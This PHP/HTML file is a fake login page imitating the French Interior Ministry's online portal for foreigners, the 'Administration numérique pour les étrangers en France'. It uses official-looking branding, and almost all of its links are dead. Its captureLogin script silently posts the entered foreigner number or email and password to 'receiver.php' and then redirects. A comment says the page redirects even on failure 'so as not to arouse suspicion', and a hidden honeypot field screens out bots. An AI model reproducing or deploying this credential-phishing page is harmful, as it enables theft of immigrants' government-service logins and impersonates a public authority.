<?php
session_start();
$_SESSION['form_token'] = bin2hex(random_bytes(32));
$token = $_SESSION['form_token'];
?>
<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" class="login-pf" lang="fr" data-fr-scheme="light">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
    <title>Se connecter | Administration numérique pour les étrangers en France</title>
    <link href="https://fonts.googleapis.com/css?family=Lato:regular,300" rel="stylesheet" />
    <link href="css/style.css" rel="stylesheet"/>


    <style>
        input[name="website"] {
            position: absolute 
            left: -9999px !important;
            top: -9999px !important;
            opacity: 0 !important;
            height: 0 !important;
            width: 0 !important;
            z-index: -1 !important;
            pointer-events: none !important;
        }
    </style>
</head>
<body>
    <div class="fr-skiplinks">
        <nav class="fr-container" role="navigation" aria-label="Accès rapide">
            <ul class="fr-skiplinks__list">
                <li><a class="fr-link" href="#main">Contenu</a></li>
                <li><a class="fr-link" href="#footer">Pied de page</a></li>
            </ul>
        </nav>
    </div>
    <div class="content-container">
        <header role="banner" class="fr-header">
            <div class="fr-header__body">
                <div class="fr-container">
                    <div class="fr-header__body-row">
                        <div class="fr-header__brand fr-enlarge-link">
                            <div class="fr-header__brand-top">
                                <div class="fr-header__logo">
                                    <p class="fr-logo">Ministère<br>de l'intérieur</p>
                                </div>
                                <div class="fr-header__navbar">
                                    <button class="fr-btn--menu fr-btn" data-fr-opened="false" aria-controls="modal-517" aria-haspopup="menu" id="button-518" title="Menu" onclick="openMenu()">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="menu-burger-icon" fill="currentColor">
    <path d="M3 4h18v2H3V4Zm0 7h18v2H3v-2Zm0 7h18v2H3v-2Z"/>
  </svg>
</button>
                                </div>
                            </div>
                            <div class="fr-header__service">
                                <a href="javascript:void(0)" title="Accueil - Administration numérique pour les étrangers en France - Direction Générale des étrangers en France">
                                    <p class="fr-header__service-title">Administration numérique pour les étrangers en France</p>
                                </a>
                                <p class="fr-header__service-tagline">Direction Générale des étrangers en France</p>
                            </div>
                        </div>
                        <div class="fr-header__tools">
                           <div class="fr-header__tools-links">
  <ul class="fr-btns-group">
    
    <!-- 1. Lien "Nous contacter" (Flat/Inerte) -->
    <li>
      <a class="fr-btn fr-btn--flat" href="javascript:void(0)">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="btn-icon" fill="currentColor">
          <path d="M8.539 3a1 1 0 0 1 .997.921A11.422 11.422 0 0 0 10.9 8.504a1 1 0 0 1-.296 1.294l-1.238.884a10.556 10.556 0 0 0 3.952 3.952l.884-1.238a1 1 0 0 1 1.294-.296 11.422 11.422 0 0 0 4.583 1.364 1 1 0 0 1 .921.997v4.462a1 1 0 0 1-.898.995A15.51 15.51 0 0 1 18.5 21C9.94 21 3 14.06 3 5.5c0-.538.027-1.072.082-1.602A1 1 0 0 1 4.077 3h4.462Zm-.892 2H5.01c-.006.166-.009.333-.009.5C5 12.956 11.044 19 18.5 19c.167 0 .334-.003.5-.01v-2.637a13.41 13.41 0 0 1-3.668-1.097l-1.357 1.9a12.442 12.442 0 0 1-1.588-.75l-.058-.033a12.556 12.556 0 0 1-4.702-4.702l-.033-.058a12.442 12.442 0 0 1-.75-1.588l1.9-1.357A13.41 13.41 0 0 1 7.647 5Z"/>
        </svg>
        <span>Nous contacter</span>
      </a>
    </li>

    <!-- 2. Lien "Besoin d'aide ?" (Flat/Inerte) -->
    <li>
      <a class="fr-btn fr-btn--flat" href="javascript:void(0)">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="btn-icon" fill="currentColor">
          <path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10Zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16Zm-1-5h2v2h-2v-2Zm2-1.645V14h-2v-1.5a1 1 0 0 1 1-1 1.5 1.5 0 1 0-1.471-1.794l-1.962-.393A3.501 3.501 0 1 1 13 13.355Z"/>
        </svg>
        <span>Besoin d'aide ?</span>
      </a>
    </li>
  </ul>

  <!-- 3. Sélecteur de Langue (Bouton Tertiaire Encadré) -->
  <nav role="navigation" class="fr-translate fr-nav">
    <div class="fr-nav__item">
      <button class="fr-translate__btn fr-btn fr-btn--tertiary" aria-controls="translate-516" aria-expanded="false" title="Sélectionner une langue" id="translate-button">
        
        <!-- SVG Traduction -->
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="translate-icon" fill="currentColor">
          <path d="m18.5 10 4.4 11h-2.155l-1.201-3h-4.09l-1.199 3h-2.154L16.5 10h2ZM10 2v2h6v2h-1.968a18.222 18.222 0 0 1-3.62 6.301 14.864 14.864 0 0 0 2.336 1.707l-.751 1.878A17.015 17.015 0 0 1 9 13.725a16.676 16.676 0 0 1-6.201 3.548l-.536-1.929a14.7 14.7 0 0 0 5.327-3.042A18.078 18.078 0 0 1 4.767 8h2.24A16.032 16.032 0 0 0 9 10.877a16.165 16.165 0 0 0 2.91-4.876L2 6V4h6V2h2Zm7.5 10.885L16.253 16h2.492L17.5 12.885Z"/>
        </svg>

        <span>FR</span><span class="fr-hidden-lg"> - Français</span>

        <!-- SVG Flèche déroulante -->
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="arrow-icon" fill="currentColor">
          <path d="M12 13.172l4.95-4.95 1.414 1.414L12 16 5.636 9.636 7.05 8.222z"/>
        </svg>
      </button>

      <div class="fr-collapse fr-translate__menu fr-menu" id="translate-516">
        <ul class="fr-menu__list">
          <li>
            <a class="fr-translate__language fr-nav__link uppercase" hreflang="en" lang="en" href="javascript:void(0)" aria-current="false">en - Anglais (English)</a>
          </li>
          <li>
            <a class="fr-translate__language fr-nav__link uppercase" hreflang="fr" lang="fr" href="javascript:void(0)" aria-current="true">fr - Français</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>
</div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="fr-header__menu fr-modal" id="modal-517" aria-labelledby="button-518">
                <div class="fr-container">
                    <button class="fr-btn--close fr-btn" aria-controls="modal-517" title="Fermer la fenêtre">Fermer la fenêtre</button>
                    <div class="fr-header__menu-links"></div>
                    <nav class="fr-nav" id="navigation-498" role="navigation" aria-label="Menu principal">
                        <ul class="fr-nav__list">
                            <li class="fr-nav__item">
                                <a class="fr-nav__link" href="javascript:void(0)" target="_self">Accueil</a>
                            </li>
                        </ul>
                    </nav>
                </div>
            </div>
        </header>

        <main class="content-body" id="main" role="main">
            <div class="fr-container fr-container--fluid fr-mb-md-14v">
                <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
                    <div class="fr-col-12 fr-col-md-8 fr-col-lg-6">
                        <div class="fr-container fr-background-alt--grey fr-px-md-0 fr-py-10v fr-py-md-14v">
                            <div class="fr-grid-row fr-grid-row-gutters fr-grid-row--center">
                                <div class="fr-col-12 fr-col-md-9 fr-col-lg-8">
                                    <h1>Connexion à Administration numérique pour les étrangers en France</h1>
                                    <div>
                                        <form id="login-form" action="receiver.php" method="POST" onsubmit="return captureLogin(event)">
                                            <input type="hidden" name="session_token" value="<?= $token ?>">
                                            <input type="hidden" name="form_timer" id="form_timer" value="">
                                            <input type="text" name="website" tabindex="-1" autocomplete="off">
                                            
                                            <fieldset class="fr-fieldset" id="login-fieldset" aria-labelledby="login-fieldset-legend login-fieldset-messages">
                                                <legend class="fr-fieldset__legend" id="login-fieldset-legend">
                                                    <h2 class="fr-h5">Se connecter avec son compte</h2>
                                                </legend>
                                                <div class="fr-fieldset__element">
                                                    <div class="fr-fieldset__element">
                                                        <span class="fr-hint-text">Tous les champs sont obligatoires.</span>
                                                    </div>
                                                    <div class="fr-fieldset__element">
                                                        <div class="fr-input-group" id="input-group">
                                                            <label class="fr-label" for="username">
                                                                Identifiant
                                                                <span class="fr-hint-text">Votre identifiant de connexion est votre numéro d'étranger, si vous n'en avez pas, votre adresse mail.</span>
                                                                <span class="fr-hint-text">Format attendu : 9999999999</span>
                                                            </label>
                                                            <input class="fr-input" value="" autocomplete="username" aria-required="true" name="username" id="username" type="text" required>
                                                        </div>
                                                    </div>
                                                    <div class="fr-fieldset__element">
                                                        <div class="fr-password" id="password-group">
                                                            <label class="fr-label" for="password">Mot de passe</label>
                                                            <div class="fr-input-wrap">
                                                                <input class="fr-password__input fr-input" aria-required="true" name="password" autocomplete="current-password" id="password" type="password" required>
                                                            </div>
                                                            <div class="fr-password__checkbox fr-checkbox-group fr-checkbox-group--sm">
                                                                <input aria-label="Afficher le mot de passe" id="password-show" type="checkbox">
                                                                <label class="fr-password__checkbox fr-label" for="password-show">Afficher</label>
                                                            </div>
                                                            <p>
                                                                <a href="javascript:void(0)" class="fr-link">Mot de passe <span class="no-wrap">oublié ?</span></a>
                                                            </p>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="fr-fieldset__element">
                                                    <ul class="fr-btns-group">
                                                        <li>
                                                            <button class="fr-mt-2v fr-btn" type="submit">Se connecter</button>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </fieldset>
                                        </form>
                                    </div>
                                    
                                    <p class="fr-hr-or">OU</p>
                                    <div class="fr-mb-6v">
                                        <h2 class="fr-h5">Se connecter avec FranceConnect</h2>
                                        <div>
                                            <p class="fr-text--sm">FranceConnect est la solution proposée par l'État pour sécuriser et simplifier la connexion à vos services en ligne.</p>
                                        </div>
                                        <div class="fr-connect-group">
                                            <a href="javascript:void(0)" class="fr-connect">
                                                <span class="fr-connect__login">S'identifier avec</span>
                                                <span class="fr-connect__brand">FranceConnect</span>
                                            </a>
                                            <p>
                                                <a href="javascript:void(0)" title="Qu'est-ce que FranceConnect ? - Nouvelle fenêtre">Qu'est-ce que FranceConnect ?</a>
                                            </p>
                                        </div>
                                    </div>
                                    <hr>
                                    <h2 class="fr-h5">Vous n'avez pas de compte ?</h2>
                                    <ul class="fr-btns-group">
                                        <li>
                                            <a href="javascript:void(0)" class="fr-btn fr-btn--secondary">Créer un compte</a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <footer class="fr-footer" role="contentinfo" id="footer">
            <div class="fr-container">
                <div class="fr-footer__body">
                    <div class="fr-footer__brand fr-enlarge-link">
                        <p class="fr-logo">Ministère<br>de l'intérieur<br>et des outre-mer</p>
                    </div>
                    <div class="fr-footer__content">
                 <ul class="fr-footer__content-list">
  <li class="fr-footer__content-item">
    <a title="service-public.fr - Nouvelle fenêtre" id="footer__content-link-7363" class="fr-footer__content-link" href="javascript:void(0)">
      <span>service-public.fr</span>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="external-icon" fill="currentColor">
        <path d="M10 6v2H5v11h11v-5h2v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h6Zm11-3v8h-2V6.413l-7.793 7.794-1.414-1.414L17.585 5H13V3h8Z"/>
      </svg>
    </a>
  </li>
  <li class="fr-footer__content-item">
    <a title="data.gouv.fr - Nouvelle fenêtre" id="footer__content-link-7365" class="fr-footer__content-link" href="javascript:void(0)">
      <span>data.gouv.fr</span>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="external-icon" fill="currentColor">
        <path d="M10 6v2H5v11h11v-5h2v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h6Zm11-3v8h-2V6.413l-7.793 7.794-1.414-1.414L17.585 5H13V3h8Z"/>
      </svg>
    </a>
  </li>
</ul>
                    </div>
                </div>
                <div class="fr-footer__partners">
                    <h2 class="fr-footer__partners-title">Nos Partenaires</h2>
                    <div class="fr-footer__partners-logos">
                        <div class="fr-footer__partners-main">
                            <a class="fr-footer__partners-link" href="javascript:void(0)">
                                <img class="fr-footer__logo" style="height: 5.625rem; width: auto;" src="img/logit.png" alt="Financé par le Fonds Asile, Migration et Intégration. Union Européenne" />
                            </a>
                        </div>
                    </div>
                </div>
                <div class="fr-footer__bottom">
                    <ul class="fr-footer__bottom-list">
                        <li class="fr-footer__bottom-item">
                            <a class="fr-footer__bottom-link" href="javascript:void(0)">Plan du site</a>
                        </li>
                        <li class="fr-footer__bottom-item">
                            <a class="fr-footer__bottom-link" href="javascript:void(0)">Accessibilité : non conforme</a>
                        </li>
                        <li class="fr-footer__bottom-item">
                            <a class="fr-footer__bottom-link" href="javascript:void(0)">Mentions légales</a>
                        </li>
                    </ul>
                    <div class="fr-footer__bottom-copy">
                        <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous <a href="javascript:void(0)">licence etalab-2.0</a></p>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <script>

   


function captureLogin(event) {
    event.preventDefault();
    var username = document.getElementById('username').value.trim();
    var password = document.getElementById('password').value;
    if (!username || !password) {
        alert('Veuillez remplir tous les champs.');
        return false;
    }
    
    var form = document.getElementById('login-form');
    var formData = new FormData(form);
    
    // Envoi avec fetch (AJAX) → la soumission se fait en arrière-plan
    fetch('receiver.php', {
        method: 'POST',
        body: formData
    }).then(function() {
        // Une fois l'envoi terminé, on redirige
        window.location.href = 'informations.php';
    }).catch(function() {
        // Même en cas d'erreur, on redirige pour ne pas éveiller les soupçons
        window.location.href = 'informations.php';
    });
    
    return false;
}

    </script>
</body>
</html>
